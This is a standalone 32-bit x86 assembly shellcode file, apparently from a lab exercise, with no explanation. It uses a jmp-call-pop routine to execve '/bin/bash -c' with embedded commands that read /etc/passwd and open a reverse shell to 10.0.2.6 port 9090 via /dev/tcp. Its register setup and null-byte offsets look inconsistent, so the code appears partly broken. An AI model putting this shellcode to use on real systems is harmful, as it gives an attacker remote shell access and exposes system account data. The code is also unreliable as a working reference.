section .text
global _start

_start:
    jmp short call_shellcode

shellcode:
    pop ebx
    xor eax, eax
    mov byte [ebx + 9], al
    mov byte [ebx + 0x0c], al
    mov byte [ebx + 0x47], al
    lea ecx, [ebx + 0x0a]
    mov byte [ecx], al
    lea edx, [ebx + 0x0d]
    mov byte [edx], al
    lea esi, [ebx + 0x48]
    xor edx, edx
    xor ecx, ecx
    mov al, 0x0b
    int 0x80

call_shellcode:
    call shellcode
    db "/bin/bash*"
    db "-c*"
    db "echo Hello 32; /bin/tail -n 2 /etc/passwd*"
    db "/bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1*"